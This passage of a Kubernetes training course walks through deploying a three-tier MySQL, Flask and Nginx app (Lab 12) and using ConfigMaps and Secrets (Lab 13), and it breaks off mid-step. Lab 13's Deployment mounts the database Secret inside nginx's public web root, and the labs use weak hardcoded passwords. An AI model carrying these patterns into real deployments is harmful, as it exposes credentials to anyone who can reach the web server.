+Persistent storage is crucial for real-world applications because:
+
+    Data Durability: Ensures critical application data survives container restarts and failures
+    Stateful Applications: Enables deployment of databases, file systems, and other stateful workloads
+    Business Continuity: Provides foundation for backup, disaster recovery, and data migration strategies
+    Scalability: Allows applications to scale while maintaining data consistency
+    Compliance: Meets regulatory requirements for data retention and security
+
+Next Steps
+
+To continue your Kubernetes journey:
+
+    Explore Dynamic Provisioning: Learn about StorageClasses and automatic PV provisioning
+    Study StatefulSets: Understand how to deploy stateful applications with ordered deployment
+    Implement Backup Strategies: Learn about volume snapshots and backup solutions
+    Security Hardening: Explore encryption at rest and access control for storage
+    Performance Optimization: Study different storage types and their performance characteristics
+
+Real-World Applications
+
+The skills you've learned apply directly to:
+
+    Database Deployments: PostgreSQL, MySQL, MongoDB in Kubernetes
+    Content Management: WordPress, Drupal, and other CMS platforms
+    Data Analytics: Persistent storage for data processing pipelines
+    File Sharing: Network-attached storage solutions
+    Backup Systems: Implementing enterprise backup and recovery solutions
+
+You now have the foundational knowledge to manage persistent storage in production Kubernetes environments, making you well-prepared for the Kubernetes and Cloud Native Associate (KCNA) certification and real-world cloud-native application development.
+
+Remember to clean up your lab resources when finished:
+
+# Run the cleanup script if you want to remove all lab resources
+./cleanup-storage.sh
+
+# Or keep them for further experimentation and learning
+
+Great job completing this hands-on lab! The persistent storage concepts you've mastered are essential for any serious Kubernetes deployment.
+
+
+
+
+Lab 12: Deploying a Multi-Tier Application in Kubernetes
+Objectives
+
+By the end of this lab, you will be able to:
+
+• Deploy a complete multi-tier application architecture in Kubernetes consisting of frontend, backend, and database components • Create and configure separate Pods for each application tier • Implement Kubernetes Services to enable secure communication between application tiers • Utilize ConfigMaps to manage application configuration data externally • Understand the principles of microservices architecture in containerized environments • Apply best practices for service discovery and inter-pod communication in Kubernetes • Troubleshoot common connectivity issues in multi-tier Kubernetes deployments
+Prerequisites
+
+Before starting this lab, you should have:
+
+• Basic understanding of Kubernetes concepts (Pods, Services, Deployments) • Familiarity with YAML syntax and file structure • Basic knowledge of containerization concepts • Understanding of web application architecture (frontend, backend, database) • Experience with command-line interface operations • Basic networking concepts (ports, IP addresses, DNS)
+
+Note: Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes already installed. Simply click "Start Lab" to access your environment - no need to build your own VM or install Kubernetes manually.
+Lab Environment Setup
+Task 1: Verify Kubernetes Cluster Status
+Subtask 1.1: Check Cluster Information
+
+First, let's verify that your Kubernetes cluster is running properly.
+
+# Check cluster information
+kubectl cluster-info
+
+# Verify node status
+kubectl get nodes
+
+# Check if all system pods are running
+kubectl get pods -n kube-system
+
+Subtask 1.2: Create Lab Namespace
+
+Create a dedicated namespace for this lab to keep resources organized.
+
+# Create namespace for the lab
+kubectl create namespace multi-tier-app
+
+# Set the namespace as default for this session
+kubectl config set-context --current --namespace=multi-tier-app
+
+# Verify namespace creation
+kubectl get namespaces
+
+Task 2: Deploy the Database Tier
+Subtask 2.1: Create Database ConfigMap
+
+Create a ConfigMap to store database configuration parameters.
+
+# Create database configuration file
+cat > database-config.yaml << 'EOF'
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: database-config
+  namespace: multi-tier-app
+data:
+  MYSQL_DATABASE: "webapp_db"
+  MYSQL_USER: "webapp_user"
+  DB_HOST: "database-service"
+  DB_PORT: "3306"
+EOF
+
+# Apply the ConfigMap
+kubectl apply -f database-config.yaml
+
+# Verify ConfigMap creation
+kubectl get configmaps
+kubectl describe configmap database-config
+
+Subtask 2.2: Create Database Secret
+
+Create a Secret to store sensitive database credentials.
+
+# Create database secret
+kubectl create secret generic database-secret \
+  --from-literal=MYSQL_ROOT_PASSWORD=rootpassword123 \
+  --from-literal=MYSQL_PASSWORD=userpassword123
+
+# Verify secret creation
+kubectl get secrets
+kubectl describe secret database-secret
+
+Subtask 2.3: Deploy Database Pod
+
+Create a MySQL database deployment.
+
+# Create database deployment file
+cat > database-deployment.yaml << 'EOF'
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: database-deployment
+  namespace: multi-tier-app
+  labels:
+    app: database
+    tier: database
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: database
+      tier: database
+  template:
+    metadata:
+      labels:
+        app: database
+        tier: database
+    spec:
+      containers:
+      - name: mysql
+        image: mysql:8.0
+        ports:
+        - containerPort: 3306
+          name: mysql
+        env:
+        - name: MYSQL_ROOT_PASSWORD
+          valueFrom:
+            secretKeyRef:
+              name: database-secret
+              key: MYSQL_ROOT_PASSWORD
+        - name: MYSQL_DATABASE
+          valueFrom:
+            configMapKeyRef:
+              name: database-config
+              key: MYSQL_DATABASE
+        - name: MYSQL_USER
+          valueFrom:
+            configMapKeyRef:
+              name: database-config
+              key: MYSQL_USER
+        - name: MYSQL_PASSWORD
+          valueFrom:
+            secretKeyRef:
+              name: database-secret
+              key: MYSQL_PASSWORD
+        volumeMounts:
+        - name: mysql-storage
+          mountPath: /var/lib/mysql
+      volumes:
+      - name: mysql-storage
+        emptyDir: {}
+EOF
+
+# Apply the database deployment
+kubectl apply -f database-deployment.yaml
+
+# Check deployment status
+kubectl get deployments
+kubectl get pods -l tier=database
+
+Subtask 2.4: Create Database Service
+
+Create a Service to expose the database within the cluster.
+
+# Create database service file
+cat > database-service.yaml << 'EOF'
+apiVersion: v1
+kind: Service
+metadata:
+  name: database-service
+  namespace: multi-tier-app
+  labels:
+    app: database
+    tier: database
+spec:
+  selector:
+    app: database
+    tier: database
+  ports:
+  - port: 3306
+    targetPort: 3306
+    protocol: TCP
+  type: ClusterIP
+EOF
+
+# Apply the database service
+kubectl apply -f database-service.yaml
+
+# Verify service creation
+kubectl get services
+kubectl describe service database-service
+
+Task 3: Deploy the Backend Tier
+Subtask 3.1: Create Backend ConfigMap
+
+Create configuration for the backend application.
+
+# Create backend configuration file
+cat > backend-config.yaml << 'EOF'
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: backend-config
+  namespace: multi-tier-app
+data:
+  DB_HOST: "database-service"
+  DB_PORT: "3306"
+  DB_NAME: "webapp_db"
+  DB_USER: "webapp_user"
+  APP_PORT: "5000"
+  APP_ENV: "production"
+EOF
+
+# Apply the backend ConfigMap
+kubectl apply -f backend-config.yaml
+
+# Verify ConfigMap creation
+kubectl describe configmap backend-config
+
+Subtask 3.2: Deploy Backend Application
+
+Create a simple backend application deployment.
+
+# Create backend deployment file
+cat > backend-deployment.yaml << 'EOF'
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: backend-deployment
+  namespace: multi-tier-app
+  labels:
+    app: backend
+    tier: backend
+spec:
+  replicas: 2
+  selector:
+    matchLabels:
+      app: backend
+      tier: backend
+  template:
+    metadata:
+      labels:
+        app: backend
+        tier: backend
+    spec:
+      containers:
+      - name: backend-app
+        image: python:3.9-slim
+        ports:
+        - containerPort: 5000
+          name: http
+        env:
+        - name: DB_HOST
+          valueFrom:
+            configMapKeyRef:
+              name: backend-config
+              key: DB_HOST
+        - name: DB_PORT
+          valueFrom:
+            configMapKeyRef:
+              name: backend-config
+              key: DB_PORT
+        - name: DB_NAME
+          valueFrom:
+            configMapKeyRef:
+              name: backend-config
+              key: DB_NAME
+        - name: DB_USER
+          valueFrom:
+            configMapKeyRef:
+              name: backend-config
+              key: DB_USER
+        - name: DB_PASSWORD
+          valueFrom:
+            secretKeyRef:
+              name: database-secret
+              key: MYSQL_PASSWORD
+        - name: APP_PORT
+          valueFrom:
+            configMapKeyRef:
+              name: backend-config
+              key: APP_PORT
+        command: ["/bin/sh"]
+        args: ["-c", "pip install flask mysql-connector-python && python -c \"
+from flask import Flask, jsonify
+import mysql.connector
+import os
+import time
+
+app = Flask(__name__)
+
+def get_db_connection():
+    max_retries = 5
+    for i in range(max_retries):
+        try:
+            connection = mysql.connector.connect(
+                host=os.environ['DB_HOST'],
+                port=int(os.environ['DB_PORT']),
+                database=os.environ['DB_NAME'],
+                user=os.environ['DB_USER'],
+                password=os.environ['DB_PASSWORD']
+            )
+            return connection
+        except Exception as e:
+            print(f'Database connection attempt {i+1} failed: {e}')
+            time.sleep(5)
+    return None
+
+@app.route('/api/health')
+def health():
+    return jsonify({'status': 'healthy', 'service': 'backend'})
+
+@app.route('/api/data')
+def get_data():
+    try:
+        conn = get_db_connection()
+        if conn:
+            cursor = conn.cursor()
+            cursor.execute('SELECT VERSION()')
+            version = cursor.fetchone()
+            conn.close()
+            return jsonify({'message': 'Backend connected to database', 'db_version': version[0]})
+        else:
+            return jsonify({'error': 'Database connection failed'}), 500
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=int(os.environ['APP_PORT']))
+\""]
+        readinessProbe:
+          httpGet:
+            path: /api/health
+            port: 5000
+          initialDelaySeconds: 30
+          periodSeconds: 10
+        livenessProbe:
+          httpGet:
+            path: /api/health
+            port: 5000
+          initialDelaySeconds: 60
+          periodSeconds: 30
+EOF
+
+# Apply the backend deployment
+kubectl apply -f backend-deployment.yaml
+
+# Check deployment status
+kubectl get deployments
+kubectl get pods -l tier=backend
+
+Subtask 3.3: Create Backend Service
+
+Create a Service to expose the backend application.
+
+# Create backend service file
+cat > backend-service.yaml << 'EOF'
+apiVersion: v1
+kind: Service
+metadata:
+  name: backend-service
+  namespace: multi-tier-app
+  labels:
+    app: backend
+    tier: backend
+spec:
+  selector:
+    app: backend
+    tier: backend
+  ports:
+  - port: 5000
+    targetPort: 5000
+    protocol: TCP
+    name: http
+  type: ClusterIP
+EOF
+
+# Apply the backend service
+kubectl apply -f backend-service.yaml
+
+# Verify service creation
+kubectl get services
+kubectl describe service backend-service
+
+Task 4: Deploy the Frontend Tier
+Subtask 4.1: Create Frontend ConfigMap
+
+Create configuration for the frontend application.
+
+# Create frontend configuration file
+cat > frontend-config.yaml << 'EOF'
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: frontend-config
+  namespace: multi-tier-app
+data:
+  BACKEND_URL: "http://backend-service:5000"
+  APP_TITLE: "Multi-Tier Kubernetes Application"
+  APP_PORT: "80"
+EOF
+
+# Apply the frontend ConfigMap
+kubectl apply -f frontend-config.yaml
+
+# Verify ConfigMap creation
+kubectl describe configmap frontend-config
+
+Subtask 4.2: Deploy Frontend Application
+
+Create a frontend application deployment.
+
+# Create frontend deployment file
+cat > frontend-deployment.yaml << 'EOF'
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: frontend-deployment
+  namespace: multi-tier-app
+  labels:
+    app: frontend
+    tier: frontend
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: frontend
+      tier: frontend
+  template:
+    metadata:
+      labels:
+        app: frontend
+        tier: frontend
+    spec:
+      containers:
+      - name: frontend-app
+        image: nginx:alpine
+        ports:
+        - containerPort: 80
+          name: http
+        env:
+        - name: BACKEND_URL
+          valueFrom:
+            configMapKeyRef:
+              name: frontend-config
+              key: BACKEND_URL
+        - name: APP_TITLE
+          valueFrom:
+            configMapKeyRef:
+              name: frontend-config
+              key: APP_TITLE
+        volumeMounts:
+        - name: frontend-content
+          mountPath: /usr/share/nginx/html
+        - name: nginx-config
+          mountPath: /etc/nginx/conf.d
+      volumes:
+      - name: frontend-content
+        configMap:
+          name: frontend-html
+      - name: nginx-config
+        configMap:
+          name: nginx-config
+EOF
+
+# Create HTML content ConfigMap
+cat > frontend-html-config.yaml << 'EOF'
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: frontend-html
+  namespace: multi-tier-app
+data:
+  index.html: |
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Multi-Tier Kubernetes App</title>
+        <style>
+            body { font-family: Arial, sans-serif; margin: 40px; background-color: #f5f5f5; }
+            .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+            .header { text-align: center; color: #333; margin-bottom: 30px; }
+            .tier { margin: 20px 0; padding: 15px; border-left: 4px solid #007acc; background: #f9f9f9; }
+            .button { background: #007acc; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; margin: 5px; }
+            .button:hover { background: #005a99; }
+            .result { margin: 10px 0; padding: 10px; background: #e8f4f8; border-radius: 4px; }
+            .error { background: #ffe6e6; color: #cc0000; }
+            .success { background: #e6ffe6; color: #006600; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="header">
+                <h1>Multi-Tier Kubernetes Application</h1>
+                <p>Frontend → Backend → Database Communication Demo</p>
+            </div>
+            
+            <div class="tier">
+                <h3>🌐 Frontend Tier (Nginx)</h3>
+                <p>This HTML page is served by an Nginx container running in the frontend pod.</p>
+                <p><strong>Status:</strong> <span style="color: green;">Active</span></p>
+            </div>
+            
+            <div class="tier">
+                <h3>⚙️ Backend Tier (Python Flask)</h3>
+                <p>Click the buttons below to test communication with the backend service.</p>
+                <button class="button" onclick="testBackendHealth()">Test Backend Health</button>
+                <button class="button" onclick="testBackendData()">Test Database Connection</button>
+                <div id="backend-result" class="result" style="display: none;"></div>
+            </div>
+            
+            <div class="tier">
+                <h3>🗄️ Database Tier (MySQL)</h3>
+                <p>MySQL database running in a separate pod, accessible via backend service.</p>
+                <p><strong>Connection:</strong> Via backend service only (not directly accessible)</p>
+            </div>
+            
+            <div class="tier">
+                <h3>📋 Architecture Overview</h3>
+                <ul>
+                    <li><strong>Frontend:</strong> Nginx serving static content (this page)</li>
+                    <li><strong>Backend:</strong> Python Flask API with health and data endpoints</li>
+                    <li><strong>Database:</strong> MySQL database with persistent storage</li>
+                    <li><strong>Communication:</strong> Services enable inter-pod communication</li>
+                    <li><strong>Configuration:</strong> ConfigMaps store application settings</li>
+                </ul>
+            </div>
+        </div>
+        
+        <script>
+            async function testBackendHealth() {
+                const resultDiv = document.getElementById('backend-result');
+                resultDiv.style.display = 'block';
+                resultDiv.innerHTML = 'Testing backend health...';
+                resultDiv.className = 'result';
+                
+                try {
+                    const response = await fetch('/api/health');
+                    const data = await response.json();
+                    resultDiv.innerHTML = `✅ Backend Health: ${JSON.stringify(data, null, 2)}`;
+                    resultDiv.className = 'result success';
+                } catch (error) {
+                    resultDiv.innerHTML = `❌ Backend Health Check Failed: ${error.message}`;
+                    resultDiv.className = 'result error';
+                }
+            }
+            
+            async function testBackendData() {
+                const resultDiv = document.getElementById('backend-result');
+                resultDiv.style.display = 'block';
+                resultDiv.innerHTML = 'Testing database connection...';
+                resultDiv.className = 'result';
+                
+                try {
+                    const response = await fetch('/api/data');
+                    const data = await response.json();
+                    resultDiv.innerHTML = `✅ Database Connection: ${JSON.stringify(data, null, 2)}`;
+                    resultDiv.className = 'result success';
+                } catch (error) {
+                    resultDiv.innerHTML = `❌ Database Connection Failed: ${error.message}`;
+                    resultDiv.className = 'result error';
+                }
+            }
+        </script>
+    </body>
+    </html>
+EOF
+
+# Create Nginx configuration ConfigMap
+cat > nginx-config.yaml << 'EOF'
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: nginx-config
+  namespace: multi-tier-app
+data:
+  default.conf: |
+    server {
+        listen 80;
+        server_name localhost;
+        
+        location / {
+            root /usr/share/nginx/html;
+            index index.html;
+        }
+        
+        location /api/ {
+            proxy_pass http://backend-service:5000;
+            proxy_set_header Host $host;
+            proxy_set_header X-Real-IP $remote_addr;
+            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+            proxy_set_header X-Forwarded-Proto $scheme;
+        }
+    }
+EOF
+
+# Apply all frontend configurations
+kubectl apply -f frontend-html-config.yaml
+kubectl apply -f nginx-config.yaml
+kubectl apply -f frontend-deployment.yaml
+
+# Check deployment status
+kubectl get deployments
+kubectl get pods -l tier=frontend
+
+Subtask 4.3: Create Frontend Service
+
+Create a Service to expose the frontend application.
+
+# Create frontend service file
+cat > frontend-service.yaml << 'EOF'
+apiVersion: v1
+kind: Service
+metadata:
+  name: frontend-service
+  namespace: multi-tier-app
+  labels:
+    app: frontend
+    tier: frontend
+spec:
+  selector:
+    app: frontend
+    tier: frontend
+  ports:
+  - port: 80
+    targetPort: 80
+    protocol: TCP
+    name: http
+  type: NodePort
+EOF
+
+# Apply the frontend service
+kubectl apply -f frontend-service.yaml
+
+# Get service details including NodePort
+kubectl get services
+kubectl describe service frontend-service
+
+Task 5: Verify Multi-Tier Application Communication
+Subtask 5.1: Check All Deployments and Services
+
+Verify that all components are running correctly.
+
+# Check all deployments
+kubectl get deployments
+
+# Check all pods
+kubectl get pods
+
+# Check all services
+kubectl get services
+
+# Check all configmaps
+kubectl get configmaps
+
+# Check all secrets
+kubectl get secrets
+
+Subtask 5.2: Test Inter-Service Communication
+
+Test communication between the tiers.
+
+# Get a frontend pod name
+FRONTEND_POD=$(kubectl get pods -l tier=frontend -o jsonpath='{.items[0].metadata.name}')
+
+# Test frontend to backend communication
+kubectl exec -it $FRONTEND_POD -- curl -s http://backend-service:5000/api/health
+
+# Test backend to database communication
+BACKEND_POD=$(kubectl get pods -l tier=backend -o jsonpath='{.items[0].metadata.name}')
+kubectl exec -it $BACKEND_POD -- curl -s http://localhost:5000/api/data
+
+# Check database connectivity from backend
+kubectl exec -it $BACKEND_POD -- curl -s http://localhost:5000/api/health
+
+Subtask 5.3: Access the Application
+
+Get the external access information for your application.
+
+# Get node IP and frontend service port
+NODE_IP=$(kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type=="ExternalIP")].address}')
+if [ -z "$NODE_IP" ]; then
+    NODE_IP=$(kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')
+fi
+
+FRONTEND_PORT=$(kubectl get service frontend-service -o jsonpath='{.spec.ports[0].nodePort}')
+
+echo "Application URL: http://$NODE_IP:$FRONTEND_PORT"
+echo "Backend Health Check: http://$NODE_IP:$FRONTEND_PORT/api/health"
+echo "Backend Data Endpoint: http://$NODE_IP:$FRONTEND_PORT/api/data"
+
+Task 6: Monitor and Troubleshoot
+Subtask 6.1: Monitor Application Logs
+
+Check logs from each tier to ensure proper operation.
+
+# Check frontend logs
+kubectl logs -l tier=frontend --tail=20
+
+# Check backend logs
+kubectl logs -l tier=backend --tail=20
+
+# Check database logs
+kubectl logs -l tier=database --tail=20
+
+Subtask 6.2: Verify ConfigMap Usage
+
+Confirm that ConfigMaps are being used correctly by the applications.
+
+# Check environment variables in backend pod
+BACKEND_POD=$(kubectl get pods -l tier=backend -o jsonpath='{.items[0].metadata.name}')
+kubectl exec -it $BACKEND_POD -- env | grep -E "(DB_|APP_)"
+
+# Check ConfigMap data
+kubectl get configmap database-config -o yaml
+kubectl get configmap backend-config -o yaml
+kubectl get configmap frontend-config -o yaml
+
+Subtask 6.3: Test Application Scaling
+
+Test the scalability of your multi-tier application.
+
+# Scale frontend deployment
+kubectl scale deployment frontend-deployment --replicas=5
+
+# Scale backend deployment
+kubectl scale deployment backend-deployment --replicas=3
+
+# Check scaling results
+kubectl get deployments
+kubectl get pods
+
+# Scale back to original size
+kubectl scale deployment frontend-deployment --replicas=3
+kubectl scale deployment backend-deployment --replicas=2
+
+Troubleshooting Common Issues
+Database Connection Issues
+
+If the backend cannot connect to the database:
+
+# Check database pod status
+kubectl describe pod -l tier=database
+
+# Verify database service endpoints
+kubectl get endpoints database-service
+
+# Test database connectivity from backend pod
+BACKEND_POD=$(kubectl get pods -l tier=backend -o jsonpath='{.items[0].metadata.name}')
+kubectl exec -it $BACKEND_POD -- nc -zv database-service 3306
+
+Service Discovery Problems
+
+If services cannot find each other:
+
+# Check DNS resolution
+kubectl exec -it $BACKEND_POD -- nslookup database-service
+kubectl exec -it $FRONTEND_POD -- nslookup backend-service
+
+# Verify service selectors match pod labels
+kubectl describe service database-service
+kubectl describe service backend-service
+
+ConfigMap Issues
+
+If configuration is not being applied:
+
+# Verify ConfigMap mounting
+kubectl describe pod $BACKEND_POD | grep -A 10 "Mounts:"
+
+# Check environment variables
+kubectl exec -it $BACKEND_POD -- printenv | grep DB_
+
+Lab Cleanup
+
+When you're finished with the lab, clean up the resources:
+
+# Delete all resources in the namespace
+kubectl delete namespace multi-tier-app
+
+# Verify cleanup
+kubectl get namespaces
+
+Conclusion
+
+Congratulations! You have successfully deployed a complete multi-tier application in Kubernetes. In this lab, you accomplished the following:
+
+Key Achievements:
+
+• Multi-Tier Architecture: Deployed a three-tier application with separate frontend (Nginx), backend (Python Flask), and database (MySQL) components, demonstrating proper separation of concerns in microservices architecture.
+
+• Pod Management: Created and managed multiple Pods across different tiers, understanding how containerized applications run in Kubernetes environments.
+
+• Service Communication: Implemented Kubernetes Services to enable secure and reliable communication between application tiers, showcasing service discovery and internal networking.
+
+• Configuration Management: Utilized ConfigMaps to externalize application configuration, making your applications more flexible and environment-agnostic.
+
+• Security Best Practices: Implemented Secrets for sensitive data like database passwords, separating configuration from sensitive information.
+
+• Application Scaling: Demonstrated horizontal scaling capabilities by running multiple replicas of frontend and backend services.
+
+Why This Matters:
+
+This lab represents real-world application deployment patterns used by organizations worldwide. Multi-tier architectures are fundamental to modern cloud-native applications because they provide:
+
+    Scalability: Each tier can be scaled independently based on demand
+    Maintainability: Changes to one tier don't affect others
+    Reliability: Failure in one component doesn't bring down the entire application
+    Security: Database access is restricted and controlled through the backend tier
+
+The skills you've developed here are directly applicable to the Kubernetes and Cloud Native Associate (KCNA) certification and are essential for anyone working with containerized applications in production environments. You now understand how to deploy, configure, and manage complex applications in Kubernetes, which is a critical skill for modern DevOps and cloud engineering roles.
+
+Next Steps:
+
+Consider exploring advanced topics like persistent volumes for database storage, ingress controllers for external access, and monitoring solutions to further enhance your Kubernetes expertise.
+
+
+
+
+Lab 13: Using ConfigMaps and Secrets for Application Configuration
+Objectives
+
+By the end of this lab, you will be able to:
+
+• Create and manage ConfigMaps to store non-sensitive configuration data • Create and manage Secrets to store sensitive information securely • Pass environment variables to Pods using ConfigMaps and Secrets • Mount ConfigMaps and Secrets as files in Pod containers • Understand the differences between ConfigMaps and Secrets • Apply best practices for application configuration management in Kubernetes
+Prerequisites
+
+Before starting this lab, you should have:
+
+• Basic understanding of Kubernetes concepts (Pods, Deployments) • Familiarity with YAML syntax • Basic command-line interface experience • Understanding of environment variables and file systems
+Ready-to-Use Cloud Machines
+
+Al Nafi provides Linux-based cloud machines with Kubernetes pre-installed. Simply click Start Lab to access your environment. No need to build your own VM or install additional software.
+
+Your lab environment includes: • Kubernetes cluster (minikube or similar) • kubectl command-line tool • Text editor (nano/vim) • All necessary permissions to create resources
+Lab Tasks
+Task 1: Create a ConfigMap to Pass Environment Variables to a Pod
+Subtask 1.1: Create a ConfigMap Using kubectl
+
+First, let's create a ConfigMap that contains application configuration data.
+
+    Create a ConfigMap with literal values:
+
+kubectl create configmap app-config \
+  --from-literal=DATABASE_HOST=mysql-service \
+  --from-literal=DATABASE_PORT=3306 \
+  --from-literal=APP_ENV=production \
+  --from-literal=LOG_LEVEL=info
+
+    Verify the ConfigMap was created:
+
+kubectl get configmaps
+
+    View the ConfigMap details:
+
+kubectl describe configmap app-config
+
+Subtask 1.2: Create a ConfigMap from a File
+
+    Create a configuration file:
+
+cat > app.properties << EOF
+database.host=mysql-service
+database.port=3306
+app.environment=production
+log.level=info
+cache.enabled=true
+cache.ttl=300
+EOF
+
+    Create a ConfigMap from the file:
+
+kubectl create configmap app-properties --from-file=app.properties
+
+    Verify the file-based ConfigMap:
+
+kubectl get configmap app-properties -o yaml
+
+Subtask 1.3: Create a Pod Using ConfigMap as Environment Variables
+
+    Create a Pod manifest that uses the ConfigMap:
+
+cat > pod-with-configmap.yaml << EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  name: app-pod-env
+  labels:
+    app: demo-app
+spec:
+  containers:
+  - name: app-container
+    image: nginx:1.21
+    envFrom:
+    - configMapRef:
+        name: app-config
+    env:
+    - name: CUSTOM_MESSAGE
+      valueFrom:
+        configMapKeyRef:
+          name: app-config
+          key: APP_ENV
+  restartPolicy: Never
+EOF
+
+    Apply the Pod manifest:
+
+kubectl apply -f pod-with-configmap.yaml
+
+    Verify the Pod is running:
+
+kubectl get pods
+
+    Check the environment variables inside the Pod:
+
+kubectl exec app-pod-env -- env | grep -E "(DATABASE|APP|LOG)"
+
+Task 2: Create a Secret to Store Sensitive Information
+Subtask 2.1: Create a Secret for Database Credentials
+
+    Create a Secret using kubectl:
+
+kubectl create secret generic db-credentials \
+  --from-literal=username=admin \
+  --from-literal=password=supersecret123 \
+  --from-literal=root-password=rootsecret456
+
+    Verify the Secret was created:
+
+kubectl get secrets
+
+    View the Secret details (note that values are base64 encoded):
+
+kubectl describe secret db-credentials
+
+    View the Secret in YAML format:
+
+kubectl get secret db-credentials -o yaml
+
+Subtask 2.2: Create a Secret from Files
+
+    Create credential files:
+
+echo -n 'admin' > username.txt
+echo -n 'supersecret123' > password.txt
+
+    Create a Secret from files:
+
+kubectl create secret generic file-credentials --from-file=username.txt --from-file=password.txt
+
+    Clean up the credential files:
+
+rm username.txt password.txt
+
+Subtask 2.3: Create a Pod Using Secrets as Environment Variables
+
+    Create a Pod manifest that uses the Secret:
+
+cat > pod-with-secret.yaml << EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  name: app-pod-secret
+  labels:
+    app: demo-app
+spec:
+  containers:
+  - name: app-container
+    image: nginx:1.21
+    env:
+    - name: DB_USERNAME
+      valueFrom:
+        secretKeyRef:
+          name: db-credentials
+          key: username
+    - name: DB_PASSWORD
+      valueFrom:
+        secretKeyRef:
+          name: db-credentials
+          key: password
+    - name: DB_ROOT_PASSWORD
+      valueFrom:
+        secretKeyRef:
+          name: db-credentials
+          key: root-password
+  restartPolicy: Never
+EOF
+
+    Apply the Pod manifest:
+
+kubectl apply -f pod-with-secret.yaml
+
+    Verify the environment variables (be careful with sensitive data):
+
+kubectl exec app-pod-secret -- env | grep DB_
+
+Task 3: Mount Both ConfigMaps and Secrets into Pods as Files
+Subtask 3.1: Create a Pod with ConfigMap and Secret as Volume Mounts
+
+    Create a comprehensive Pod manifest:
+
+cat > pod-with-volumes.yaml << EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  name: app-pod-volumes
+  labels:
+    app: demo-app
+spec:
+  containers:
+  - name: app-container
+    image: nginx:1.21
+    volumeMounts:
+    - name: config-volume
+      mountPath: /etc/config
+      readOnly: true
+    - name: secret-volume
+      mountPath: /etc/secrets
+      readOnly: true
+    - name: properties-volume
+      mountPath: /etc/properties
+      readOnly: true
+    env:
+    - name: CONFIG_PATH
+      value: "/etc/config"
+    - name: SECRETS_PATH
+      value: "/etc/secrets"
+  volumes:
+  - name: config-volume
+    configMap:
+      name: app-config
+  - name: secret-volume
+    secret:
+      secretName: db-credentials
+      defaultMode: 0400
+  - name: properties-volume
+    configMap:
+      name: app-properties
+  restartPolicy: Never
+EOF
+
+    Apply the Pod manifest:
+
+kubectl apply -f pod-with-volumes.yaml
+
+    Wait for the Pod to be ready:
+
+kubectl wait --for=condition=Ready pod/app-pod-volumes --timeout=60s
+
+Subtask 3.2: Verify Mounted Files
+
+    Check the ConfigMap files:
+
+kubectl exec app-pod-volumes -- ls -la /etc/config/
+
+    View ConfigMap content:
+
+kubectl exec app-pod-volumes -- cat /etc/config/DATABASE_HOST
+kubectl exec app-pod-volumes -- cat /etc/config/APP_ENV
+
+    Check the Secret files (note the restricted permissions):
+
+kubectl exec app-pod-volumes -- ls -la /etc/secrets/
+
+    View Secret content:
+
+kubectl exec app-pod-volumes -- cat /etc/secrets/username
+
+    Check the properties file:
+
+kubectl exec app-pod-volumes -- ls -la /etc/properties/
+kubectl exec app-pod-volumes -- cat /etc/properties/app.properties
+
+Subtask 3.3: Create a Deployment Using ConfigMaps and Secrets
+
+    Create a Deployment manifest:
+
+cat > deployment-with-config.yaml << EOF
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: web-app-deployment
+  labels:
+    app: web-app
+spec:
+  replicas: 2
+  selector:
+    matchLabels:
+      app: web-app
+  template:
+    metadata:
+      labels:
+        app: web-app
+    spec:
+      containers:
+      - name: web-container
+        image: nginx:1.21
+        ports:
+        - containerPort: 80
+        envFrom:
+        - configMapRef:
+            name: app-config
+        env:
+        - name: DB_USERNAME
+          valueFrom:
+            secretKeyRef:
+              name: db-credentials
+              key: username
+        - name: DB_PASSWORD
+          valueFrom:
+            secretKeyRef:
+              name: db-credentials
+              key: password
+        volumeMounts:
+        - name: config-volume
+          mountPath: /usr/share/nginx/html/config
+          readOnly: true
+        - name: secret-volume
+          mountPath: /usr/share/nginx/html/secrets
+          readOnly: true
+      volumes:
+      - name: config-volume
+        configMap:
+          name: app-config
+      - name: secret-volume
+        secret:
+          secretName: db-credentials
+          defaultMode: 0400
+EOF
+
+    Apply the Deployment:
+
+kubectl apply -f deployment-with-config.yaml
+
+    Verify the Deployment:
+
+kubectl get deployments
+kubectl get pods -l app=web-app
+
+    Test configuration in one of the Deployment pods:
+
+POD_NAME=$(kubectl get pods -l app=web-app -o jsonpath='{.items[0].metadata.name}')
+kubectl exec $POD_NAME -- env | grep -E "(DATABASE|APP|LOG|DB_)"
+
+Task 4: Update ConfigMaps and Secrets
+Subtask 4.1: Update a ConfigMap
+
+    Update the ConfigMap:
+
+kubectl patch configmap app-config --patch '{"data":{"LOG_LEVEL":"debug","NEW_FEATURE":"enabled"}}'
+
+    Verify the update:
+
+kubectl describe configmap app-config
+
+    Check if mounted files are updated (may take a few moments):
+
+kubectl exec app-pod-volumes -- cat /etc/config/LOG_LEVEL
+kubectl exec app-pod-volumes -- cat /etc/config/NEW_FEATURE
+
+Subtask 4.2: Update a Secret
+
+    Update the Secret:
+
